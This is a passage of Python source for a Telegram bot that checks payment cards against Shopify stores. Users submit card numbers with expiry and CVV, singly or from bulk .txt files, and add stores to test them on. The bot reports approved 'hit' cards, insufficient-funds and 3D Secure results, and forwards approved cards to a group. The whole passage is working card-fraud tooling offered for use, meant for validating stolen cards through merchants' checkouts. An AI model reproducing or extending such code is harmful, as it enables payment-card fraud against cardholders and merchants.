        bot.answer_callback_query(call.id, "Mass Check Information")
        bot.send_message(
            call.message.chat.id,
            "<b>📊 Mass Card Checking</b>\n\n"
            "1. Prepare a .txt file with cards (one per line)\n"
            "2. Send the file to the bot\n"
            "3. Reply to the file with <code>/mass</code>\n"
            "4. The bot will check all cards and show results\n\n"
            "Card format: <code>CC|MM|YYYY|CVV</code>",
            parse_mode='HTML'
        )
    
    elif call.data == "my_sites_info":
        bot.answer_callback_query(call.id, "My Sites Information")
        bot.send_message(
            call.message.chat.id,
            "<b>🌐 Your Shopify Sites</b>\n\n"
            "Use <code>/myurl</code> to view all your added sites\n"
            "Use <code>/seturl</code> to add a new site\n"
            "Use <code>/msite</code> to add sites from .txt file\n"
            "Use <code>/rmurl</code> to remove a site\n"
            "Use <code>/clean</code> to remove non-working sites",
            parse_mode='HTML'
        )
    
    elif call.data == "add_site_info":
        bot.answer_callback_query(call.id, "Add Site Information")
        bot.send_message(
            call.message.chat.id,
            "<b>➕ Adding Shopify Sites</b>\n\n"
            "Single site: <code>/seturl your-shop.myshopify.com</code>\n"
            "Multiple sites: <code>/maddurl</code> followed by URLs (one per line)\n\n"
            "The bot will test each site before adding it to ensure it's working.",
            parse_mode='HTML'
        )
    
    elif call.data == "bulk_add_info":
        bot.answer_callback_query(call.id, "Bulk Add Information")
        bot.send_message(
            call.message.chat.id,
            "<b>📁 Bulk Add Sites from File</b>\n\n"
            "1. Prepare a .txt file with Shopify URLs (one per line)\n"
            "2. Send the file to the bot\n"
            "3. Reply to the file with <code>/msite</code>\n"
            "4. The bot will auto-detect Shopify sites and add them\n\n"
            "The bot can detect:\n"
            "• myshopify.com domains\n"
            "• Shopify store URLs\n"
            "• Any valid Shopify site URL",
            parse_mode='HTML'
        )

# Shopify sites auto-detection from .txt file - FIXED
def extract_shopify_sites_from_file(file_content):
    """Extract Shopify sites from text file content - FIXED"""
    shopify_sites = []
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
            
        # Clean the URL
        if ' ' in line:
            line = line.split()[0]
        
        # Check if it's already a valid URL
        if not line.startswith(('http://', 'https://')):
            line = 'https://' + line
        
        # Validate URL format
        try:
            parsed = urlparse(line)
            if not parsed.netloc:
                continue
                
            # Check if it looks like a Shopify site
            if '.myshopify.com' in parsed.netloc.lower():
                shopify_sites.append(line)
                continue
                
            # Also accept any .com domain for now (can be validated later)
            if parsed.netloc.endswith('.com'):
                shopify_sites.append(line)
                    
        except Exception:
            continue
    
    return list(set(shopify_sites))  # Remove duplicates

# Bulk add Shopify sites from file - FIXED with proper messaging
@bot.message_handler(commands=['msite', 'bulkadd'])  # Added /msite command
@flood_control
def handle_msite(message):
    """Add Shopify sites from .txt file - FIXED with proper site validation"""
    user_id = str(message.from_user.id)
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, 
            "❌ *Please reply to a .txt file with /msite command*\n\n"
            "*Example:*\n"
            "1. Send a .txt file with Shopify URLs (one per line)\n"
            "2. Reply to that file with <code>/msite</code>\n"
            "3. The bot will auto-detect and add valid Shopify sites",
            parse_mode='Markdown'
        )
        return
    
    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        status_msg = bot.reply_to(message, "📁 *Processing file... Extracting Shopify sites...*", parse_mode='Markdown')
        
        # Extract Shopify sites from file
        shopify_sites = extract_shopify_sites_from_file(downloaded_file)
        
        if not shopify_sites:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text="❌ *No Shopify sites found in the file.*\n\n"
                     "*Please make sure the file contains valid Shopify URLs.*\n"
                     "*Example URLs:*\n"
                     "• storename.myshopify.com\n"
                     "• https://storename.myshopify.com",
                parse_mode='Markdown'
            )
            return
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"✅ *Found {len(shopify_sites)} potential Shopify sites.*\n\n"
                 f"🔄 *Testing and adding sites...*\n"
                 f"*Progress:* 0/{len(shopify_sites)}",
            parse_mode='Markdown'
        )
        
        if user_id not in USER_SITES:
            USER_SITES[user_id] = []
        
        added_count = 0
        failed_count = 0
        already_exists_count = 0
        
        for i, url in enumerate(shopify_sites):
            # Update progress every 2 sites
            if i % 2 == 0 or i == len(shopify_sites) - 1:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"✅ *Found {len(shopify_sites)} potential Shopify sites.*\n\n"
                         f"🔄 *Testing and adding sites...*\n"
                         f"*Progress:* {i+1}/{len(shopify_sites)}\n"
                         f"✅ *Added:* {added_count} | ❌ *Failed:* {failed_count} | ⚠️ *Already exists:* {already_exists_count}",
                    parse_mode='Markdown'
                )
            
            # Check if URL already exists
            exists = False
            for site in USER_SITES[user_id]:
                if site['url'] == url:
                    exists = True
                    already_exists_count += 1
                    break
            
            if exists:
                continue
            
            # Test the Shopify site
            try:
                is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
                
                if is_valid:
                    USER_SITES[user_id].append({
                        'url': url,
                        'price': price,
                        'working': True,
                        'last_checked': datetime.now().isoformat(),
                        'gateway': gateway
                    })
                    added_count += 1
                    
                    # Send individual site added message
                    bot.send_message(
                        message.chat.id,
                        f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>
                            
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message[:50]}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➳ {gateway}

<i>✅ Successfully added to your sites list</i>
─────── ⸙ ────────
""",
                        parse_mode='HTML',
                        disable_web_page_preview=True
                    )
                else:
                    failed_count += 1
                    # Send failed site message
                    bot.send_message(
                        message.chat.id,
                        f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗦𝗶𝘁𝗲 𝗙𝗮𝗶𝗹𝗲𝗱 ❌</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>
                            
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {test_message[:50]}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝘁𝗮𝘁𝘂𝘀 ➳ Not Working

<i>❌ Skipped - Site not working</i>
─────── ⸙ ────────
""",
                        parse_mode='HTML',
                        disable_web_page_preview=True
                    )
                    
            except Exception as e:
                failed_count += 1
            
            # Small delay to avoid rate limiting
            time.sleep(1)
        
        save_data()
        
        # Final result with stylish format
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗕𝘂𝗹𝗸 𝗔𝗱𝗱 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲𝘀 𝗳𝗼𝘂𝗻𝗱 ➳ {len(shopify_sites)}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝗱𝗱𝗲𝗱 ➳ {added_count}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗮𝗱𝗱 ➳ {failed_count}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝗲𝗱 ➳ {already_exists_count}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗧𝗼𝘁𝗮𝗹 𝘀𝗶𝘁𝗲𝘀 𝗻𝗼𝘄 ➳ {len(USER_SITES[user_id])}

<a href='https://t.me/solo_rohan'>──────── ⸙ ─────────</a>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝙐𝙨𝙚 <code>/myurl</code> 𝙩𝙤 𝙫𝙞𝙚𝙬 𝙖𝙡𝙡 𝙮𝙤𝙪𝙧 𝙨𝙞𝙩𝙚𝙨
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝙐𝙨𝙚 <code>/clean</code> 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙣-𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝙐𝙨𝙚 <code>/sh</code> 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙘𝙖𝙧𝙙𝙨
            """,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

# Update the require_approval decorator - FIXED
def require_approval(func):
    def wrapper(message, *args, **kwargs):
        user_id = message.from_user.id
        
        # Admins always have access
        if user_id in ADMIN_IDS:
            return func(message, *args, **kwargs)
        
        # Check if user is approved
        if message.chat.type == 'private' and str(user_id) not in APPROVED_USERS:
            if user_id in PENDING_APPROVAL:
                bot.reply_to(message, "⏳ *Your request is pending admin approval. Please wait.*", parse_mode='Markdown')
            else:
                request_approval(message)
            return
        
        # Check subscription for private chats
        if message.chat.type == 'private' and str(user_id) not in SUBSCRIBED_USERS:
            check_subscription(message)
            return
            
        return func(message, *args, **kwargs)
    return wrapper

# Update /seturl handler with proper site validation and messaging
@bot.message_handler(commands=['seturl'])
@require_approval
@flood_control
def handle_seturl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ *Usage:* `/seturl <your_shopify_site_url>`", parse_mode='Markdown')
            return
            
        url = parts[1].strip()
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        status_msg = bot.reply_to(message, f"🔄 *Adding URL:* `{url}`\n*Testing reachability...*", parse_mode='Markdown')
        
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ *Invalid URL format:* `{str(e)}`",
                                parse_mode='Markdown')
            return
            
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"🔄 *Testing URL:* `{url}`\n*Testing with test card...*",
                            parse_mode='Markdown')
        
        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
        if not is_valid:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗦𝗶𝘁𝗲 𝗙𝗮𝗶𝗹𝗲𝗱 ❌</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {test_message[:50]}

<i>❌ Failed to verify Shopify site. Please check your URL and try again.</i>
─────── ⸙ ────────
""",
                                parse_mode='HTML',
                                disable_web_page_preview=True)
            return

        if user_id not in USER_SITES:
            USER_SITES[user_id] = []
            
        # Check if URL already exists
        for site in USER_SITES[user_id]:
            if site['url'] == url:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ *This URL is already in your list.*",
                                    parse_mode='Markdown')
                return
        
        USER_SITES[user_id].append({
            'url': url,
            'price': price,
            'working': True,
            'last_checked': datetime.now().isoformat(),
            'gateway': gateway
        })
        save_data()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>
                            
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message[:50]}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}
<a href='https://t.me/solo_rohan'>[⸙]</a>❖ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➳ {gateway}

<i>✅ Successfully added to your sites list</i>
─────── ⸙ ────────
""",
                            parse_mode='HTML',
                            disable_web_page_preview=True)
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

# Add /chk command as alias for /sh
@bot.message_handler(commands=['chk'])
@require_approval
@flood_control
def handle_chk(message):
    # Redirect to the /sh handler
    message.text = message.text.replace('/chk', '/sh', 1)
    handle_sh(message)

# Add /mchk command as alias for /mass
@bot.message_handler(commands=['mchk'])
@require_approval
@flood_control
def handle_mchk(message):
    # Redirect to the /mass handler
    message.text = message.text.replace('/mchk', '/mass', 1)
    handle_mass(message)

# Update /sh handler with stylish results
@bot.message_handler(commands=['sh'])
@require_approval
@flood_control
def handle_sh(message):
    user_id = str(message.from_user.id)
    
    if user_id not in USER_SITES or not USER_SITES[user_id]:
        bot.reply_to(message, "❌ *You haven't added any sites yet.*\n\n*Add a site with:* `/seturl <your_shopify_url>`\n*View sites with:* `/myurl`", parse_mode='Markdown')
        return
    
    # Filter working sites
    working_sites = [site for site in USER_SITES[user_id] if site.get('working', True)]
    if not working_sites:
        bot.reply_to(message, "❌ *All your sites are marked as not working.*\n\n*Please add new sites with:* `/seturl`", parse_mode='Markdown')
        return

    try:
        cc = None
        
        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
           (message.text.startswith('/chk') and len(message.text.split()) == 1):
            
            if message.reply_to_message:
                replied_text = message.reply_to_message.text
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    cc = matches[0].replace(' ', '').replace('-', '')
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ *Invalid format.*\n\n*Use:* `/sh CC|MM|YYYY|CVV`\n*Or:* `.sh CC|MM|YYYY|CVV`", parse_mode='Markdown')
                    return
                cc = parts[1]
            else:
                cc = message.text[4:].strip()

        if not cc:
            bot.reply_to(message, "❌ *No card found.*\n\n*Either provide CC details after command or reply to a message containing CC details.*", parse_mode='Markdown')
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        # Select a random working site
        site_info = random.choice(working_sites)
        
        bin_number = cc.split('|')[0][:6] if '|' in cc else cc[:6]
        bin_info = get_bin_info(bin_number) or {}
        brand = bin_info.get('brand', 'UNKNOWN')
        card_type = bin_info.get('type', 'UNKNOWN')
        country = bin_info.get('country', 'UNKNOWN')
        country_flag = bin_info.get('country_flag', '🇺🇳')

        status_msg = bot.reply_to(
            message,
            f"""
🔰 <b>Checking Card...</b>

<b>Card:</b> <code>{cc}</code>
<b>Gateway:</b> Self Shopify [${site_info.get('price', '1.0')}]
<b>Status:</b> Processing...
<b>Brand:</b> {brand}
<b>Type:</b> {card_type}
<b>Country:</b> {country} {country_flag}
            """,
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc, site_info)
                processing_time = time.time() - start_time
                
                # Mark site as not working if response indicates issues
                response_upper = result['message'].upper()
                if any(x in response_upper for x in ['FRAUD_SUSPECTED', 'CARD_DECLINED', 'API Error', 'Exception', 'UNKNOWN']):
                    site_info['working'] = False
                    site_info['last_checked'] = datetime.now().isoformat()
                    save_data()

                # Send to user with STYLISH FORMAT
                if result['status'] in ['APPROVED', 'APPROVED_OTP']:
                    # Use the new format for approved cards
                    response_text = format_approved_response(result, user_full_name, processing_time, site_info['url'])
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        text=response_text,
                        parse_mode='HTML'
                    )
                    
                    # Also send to group
                    send_to_group(result, user_full_name, processing_time, site_info['url'])
                    
                    # Send notification to user with STYLISH FORMAT
                    if 'INSUFFICIENT' in result['message'].upper():
                        insufficient_msg = f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💰</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<b>Card:</b> <code>{result['card']}</code>
<b>Response:</b> {result['message']}
"""
                        bot.send_message(
                            message.chat.id,
                            insufficient_msg,
                            parse_mode='HTML'
                        )
                    elif result['status'] == 'APPROVED':
                        hit_msg = f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝗛𝗜𝗧 𝗖𝗔𝗥𝗗 𝗙𝗢𝗨𝗡𝗗 ✅</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<b>Card:</b> <code>{result['card']}</code>
<b>Response:</b> {result['message']}
"""
                        bot.send_message(
                            message.chat.id,
                            hit_msg,
                            parse_mode='HTML'
                        )
                    else:
                        threed_msg = f"""
<a href='https://t.me/solo_rohan'>┏━━━━━━━⍟</a>
<a href='https://t.me/solo_rohan'>┃ 𝟯𝗗 𝗦𝗘𝗖𝗨𝗥𝗘 𝗖𝗔𝗥𝗗 🔐</a>
<a href='https://t.me/solo_rohan'>┗━━━━━━━━━━━⊛</a>

<b>Card:</b> <code>{result['card']}</code>
<b>Response:</b> {result['message']}
"""
                        bot.send_message(
                            message.chat.id,
                            threed_msg,
                            parse_mode='HTML'
                        )
                else:
                    # Use the STYLISH format for other cards
                    response_text = format_shopify_response(result, user_full_name, processing_time)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        text=response_text,
                        parse_mode='HTML'
                    )

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ *An error occurred:* `{str(e)[:100]}`",
                    parse_mode='Markdown'
                )

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)[:100]}`", parse_mode='Markdown')

# Clean up old cache periodically
def cleanup_cache():
    while True:
        time.sleep(600)  # Run every 10 minutes
        current_time = time.time()
        
        # Clean BIN cache
        global BIN_CACHE
        BIN_CACHE = {k: v for k, v in BIN_CACHE.items() 
                    if current_time - v[1] < CACHE_TIMEOUT}
        
        # Clean site cache
        global SITE_CACHE
        SITE_CACHE = {k: v for k, v in SITE_CACHE.items() 
                     if current_time - v[1] < CACHE_TIMEOUT}
        
        print(f"Cache cleaned. BIN: {len(BIN_CACHE)}, Sites: {len(SITE_CACHE)}")

# Start cache cleanup in background
cache_cleanup_thread = threading.Thread(target=cleanup_cache, daemon=True)
cache_cleanup_thread.start()

# Start the bot with error handling
if __name__ == "__main__":
    print("Bot is starting...")
    print(f"Approved users: {len(APPROVED_USERS)}")
    print(f"Subscribed users: {len(SUBSCRIBED_USERS)}")
    print(f"Pending approvals: {len(PENDING_APPROVAL)}")
    print("=" * 50)
    print("Bot Features:")
    print(" Welcome message with stylish formatting")
    print(" Admin approval system - FIXED")
    print(" Bulk Shopify site adding from .txt files - FIXED")
    print(" Auto-detection of Shopify sites - FIXED")
    print(" Stylish result messages")
    print(" Performance optimizations")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            print("Restarting in 10 seconds...")
            time.sleep(10)